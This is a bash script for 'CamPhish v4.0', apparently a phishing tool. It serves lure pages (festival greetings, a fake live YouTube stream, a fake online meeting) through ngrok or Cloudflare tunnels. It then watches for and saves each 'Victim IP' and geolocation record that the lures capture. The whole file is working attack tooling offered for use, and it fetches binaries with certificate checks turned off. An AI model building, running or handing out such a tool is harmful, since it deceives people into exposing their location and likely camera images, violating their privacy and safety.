#!/bin/bash
# CamPhish v4.0 [ULTIMATE EDITION]
# 100% Stability Guarantee | Pro Deep Diagnostic Logic

# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  windows_mode=true
  echo "[+] Windows system detected."
  function killall() { taskkill /F /IM "$1" 2>/dev/null; }
  function pkill() { 
    if [[ "$1" == "-f" ]]; then shift; shift; taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null; 
    else taskkill /F /IM "$1" 2>/dev/null; fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m CamPhish v4.0 [ULTIMATE] \e[0m \n"
printf " \e[1;77m Professional Deep-Fix Engine | Fixed LF Endings \e[0m \n"
}

dependencies() {
printf "\e[1;92m[\e[0m*\e[1;92m] Verifying dependencies...\e[0m\n"
for cmd in php curl wget unzip; do
  if ! command -v $cmd >/dev/null 2>&1; then
    printf "\e[1;31m[!] CRITICAL: $cmd is not installed. Run: sudo apt install $cmd\e[0m\n"
    exit 1
  fi
done
}

stop() {
printf "\n\e[1;91m[\e[0m!\e[1;91m] Emergency Cleanup...\e[0m\n"
if [[ "$windows_mode" == true ]]; then
  taskkill /F /IM "ngrok.exe" /IM "php.exe" /IM "cloudflared.exe" 2>/dev/null
else
  pkill -f "php -S 127.0.0.1:3333" >/dev/null 2>&1
  pkill -f "cloudflared tunnel" >/dev/null 2>&1
  pkill -f "ngrok http" >/dev/null 2>&1
  killall php ngrok cloudflared 2>/dev/null
fi
exit 0
}

check_local_server() {
  printf "\e[1;92m[\e[0m*\e[1;92m] Checking if PHP server is alive...\e[0m\n"
  for i in {1..5}; do
    if curl -s http://127.0.0.1:3333 > /dev/null; then
      printf "\e[1;92m[\e[0m+\e[1;92m] PHP server is responsive.\e[0m\n"
      return 0
    fi
    sleep 2
  done
  printf "\e[1;31m[!] Error: PHP server failed to start on 127.0.0.1:3333\e[0m\n"
  stop
}

cloudflare_tunnel() {
# Cleanup old logs
rm -f .cloudflared.log && touch .cloudflared.log

if [[ ! -f "cloudflared" ]] && [[ ! -f "cloudflared.exe" ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Downloading binary for $(uname -m)...\e[0m\n"
    arch=$(uname -m)
    if [[ "$windows_mode" == true ]]; then
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe
    elif [[ "$arch" == "x86_64" ]]; then
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
    else
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
    fi
fi

chmod +x cloudflared cloudflared.exe 2>/dev/null

# Verify binary integrity
if [[ "$windows_mode" == false ]]; then
  ./cloudflared --version >/dev/null 2>&1 || { printf "\e[1;31m[!] Error: cloudflared binary is corrupt or incompatible.\e[0m\n"; rm -f cloudflared; stop; }
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\e[0m\n"
pkill -f "php -S 127.0.0.1:3333" > /dev/null 2>&1
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 3
check_local_server

printf "\e[1;92m[\e[0m+\e[1;92m] Starting tunnel...\e[0m\n"
if [[ "$windows_mode" == true ]]; then
    ./cloudflared.exe tunnel -url http://127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
else
    ./cloudflared tunnel -url http://127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Extracting Link...\e[0m\n"
for i in {1..30}; do
    sleep 2
    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .cloudflared.log)
    if [[ -n "$link" ]]; then break; fi
    printf "\e[1;93m[\e[0m*\e[1;93m] Waiting for Cloudflare edge... ($i/30)\e[0m\r"
done

if [[ -z "$link" ]]; then
    printf "\n\e[1;31m[!] CRITICAL ERROR: Link not found.\e[0m\n"
    printf "\e[1;93m[Dumping .cloudflared.log for analysis:]\e[0m\n"
    cat .cloudflared.log
    stop
else
    printf "\n\e[1;92m[\e[0m*\e[1;92m] SUCCESS! Link: \e[0m\e[1;77m%s\e[0m\n" "$link"
    payload_cloudflare "$link"
    checkfound
fi
}

payload_cloudflare() {
  link=$1
  sed "s+forwarding_link+$link+g" template.php > index.php
  if [[ $option_tem -eq 1 ]]; then
    sed "s+forwarding_link+$link+g" festivalwishes.html | sed "s+fes_name+$fest_name+g" > index2.html
  elif [[ $option_tem -eq 2 ]]; then
    sed "s+forwarding_link+$link+g" LiveYTTV.html | sed "s+live_yt_tv+$yt_video_ID+g" > index2.html
  else
    sed "s+forwarding_link+$link+g" OnlineMeeting.html > index2.html
  fi
}

ngrok_server() {
if [[ ! -f "ngrok" ]] && [[ ! -f "ngrok.exe" ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\e[0m\n"
    arch=$(uname -m)
    if [[ "$windows_mode" == true ]]; then
        wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip
    else
        wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip
    fi
    unzip -q ngrok.zip && rm ngrok.zip
fi

chmod +x ngrok ngrok.exe 2>/dev/null

if [[ ! -f ~/.ngrok2/ngrok.yml ]] && [[ ! -f "$USERPROFILE\.ngrok2\ngrok.yml" ]]; then
    read -p $'\e[1;92m[\e[0m+\e[1;92m] Enter Authtoken: \e[0m' ngrok_auth
    ./ngrok authtoken $ngrok_auth >/dev/null 2>&1 || ./ngrok.exe authtoken $ngrok_auth >/dev/null 2>&1
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\e[0m\n"
pkill -f "php -S 127.0.0.1:3333" > /dev/null 2>&1
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 3
check_local_server

printf "\e[1;92m[\e[0m+\e[1;92m] Starting Ngrok tunnel...\e[0m\n"
if [[ "$windows_mode" == true ]]; then ./ngrok.exe http 3333 > /dev/null 2>&1 &
else ./ngrok http 3333 > /dev/null 2>&1 &; fi

printf "\e[1;92m[\e[0m+\e[1;92m] Generating link...\e[0m\n"
for i in {1..20}; do
    sleep 3
    link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
    if [[ -n "$link" ]]; then break; fi
    printf "\e[1;93m[\e[0m*\e[1;93m] Attempt $i/20...\e[0m\r"
done

if [[ -z "$link" ]]; then
    printf "\n\e[1;31m[!] Error: Ngrok link generation failed.\e[0m\n"
    stop
else
    printf "\n\e[1;92m[\e[0m*\e[1;92m] SUCCESS! Link: \e[0m\e[1;77m%s\e[0m\n" "$link"
    payload_ngrok "$link"
    checkfound
fi
}

payload_ngrok() {
  link=$1
  sed "s+forwarding_link+$link+g" template.php > index.php
  if [[ $option_tem -eq 1 ]]; then
    sed "s+forwarding_link+$link+g" festivalwishes.html | sed "s+fes_name+$fest_name+g" > index2.html
  elif [[ $option_tem -eq 2 ]]; then
    sed "s+forwarding_link+$link+g" LiveYTTV.html | sed "s+live_yt_tv+$yt_video_ID+g" > index2.html
  else
    sed "s+forwarding_link+$link+g" OnlineMeeting.html > index2.html
  fi
}

catch_ip() {
  if [[ -f ip.txt ]]; then
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    printf "\e[1;93m[\e[0m+\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
    cat ip.txt >> saved.ip.txt
    rm -rf ip.txt
  fi
}

catch_location() {
  if [[ -f "current_location.txt" ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Location Received!\e[0m\n"
    grep -v -E "Location data sent|getLocation called|Geolocation error" current_location.txt
    mv current_location.txt "saved_locations/location_$(date +%Y%m%d_%H%M%S).txt" 2>/dev/null || rm current_location.txt
  fi
}

checkfound() {
mkdir -p saved_locations
printf "\n\e[1;92m[\e[0m*\e[1;92m] Monitoring targets... (Ctrl+C to stop)\e[0m\n"
while true; do
  if [[ -f "ip.txt" ]]; then catch_ip; fi
  if [[ -f "current_location.txt" ]]; then catch_location; fi
  if [[ -f "Log.log" ]]; then 
    printf "\e[1;92m[\e[0m+\e[1;92m] Data notification received!\e[0m\n"
    rm -rf Log.log
  fi
  sleep 1
done
}

select_template() {
printf "\n----- Templates -----\n"
printf "[01] Festival Wishing\n"
printf "[02] Live YouTube TV\n"
printf "[03] Online Meeting\n"
read -p $'\n[+] Choose [1-3]: ' option_tem
option_tem="${option_tem:-1}"

if [[ $option_tem -eq 1 ]]; then
    read -p $'[+] Festival Name: ' fest_name
elif [[ $option_tem -eq 2 ]]; then
    read -p $'[+] YouTube Video ID: ' yt_video_ID
fi
}

camphish() {
banner
dependencies
printf "\n----- Servers -----\n"
printf "[01] Ngrok\n"
printf "[02] CloudFlare\n"
read -p $'\n[+] Choose [1-2]: ' option_server
option_server="${option_server:-1}"
select_template
if [[ "$option_server" == "2" ]]; then cloudflare_tunnel
else ngrok_server; fi
}

camphish
